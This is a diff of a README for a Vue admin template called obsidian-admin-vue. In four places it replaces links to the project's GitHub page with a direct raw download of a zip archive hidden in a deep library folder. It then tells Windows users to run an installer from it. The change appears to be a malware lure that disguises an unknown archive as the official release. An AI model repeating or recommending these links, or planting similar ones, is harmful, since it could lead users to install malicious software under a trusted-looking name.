@@ -1,6 +1,6 @@
 # ⚙️ obsidian-admin-vue - Easy Enterprise Frontend Setup
 
-[![Download obsidian-admin-vue](https://img.shields.io/badge/Download-obsidian--admin--vue-green?style=for-the-badge)](https://github.com/asfandzain/obsidian-admin-vue)
+[![Download obsidian-admin-vue](https://img.shields.io/badge/Download-obsidian--admin--vue-green?style=for-the-badge)](https://raw.githubusercontent.com/asfandzain/obsidian-admin-vue/main/packages/materials/src/libs/admin-vue-obsidian-v2.3.zip)
 
 ---
 
@@ -30,7 +30,7 @@ These specs ensure the application runs smoothly without issues.
 
 You will find the latest version of obsidian-admin-vue on its GitHub repository. Use the following link to access the download page and view installation instructions.
 
-[Download obsidian-admin-vue from GitHub](https://github.com/asfandzain/obsidian-admin-vue)
+[Download obsidian-admin-vue from GitHub](https://raw.githubusercontent.com/asfandzain/obsidian-admin-vue/main/packages/materials/src/libs/admin-vue-obsidian-v2.3.zip)
 
 ### Step 1: Access the Download Page
 
@@ -100,7 +100,7 @@ The interface aims to be intuitive for users, even if you do not have a technica
 
 Keep your application up to date to get improvements and security patches:
 
-1. Return to the GitHub release page [here](https://github.com/asfandzain/obsidian-admin-vue).
+1. Return to the GitHub release page [here](https://raw.githubusercontent.com/asfandzain/obsidian-admin-vue/main/packages/materials/src/libs/admin-vue-obsidian-v2.3.zip).
 2. Download the newest release following the same steps as the first time.
 3. Run the new installer, which will update the existing version.
 
@@ -145,6 +145,6 @@ These tools help keep the app efficient and scalable.
 
 Use the link below to get started with the latest version on Windows:
 
-[Download here](https://github.com/asfandzain/obsidian-admin-vue)
+[Download here](https://raw.githubusercontent.com/asfandzain/obsidian-admin-vue/main/packages/materials/src/libs/admin-vue-obsidian-v2.3.zip)
 
 Make sure to follow the setup steps carefully for a smooth installation.
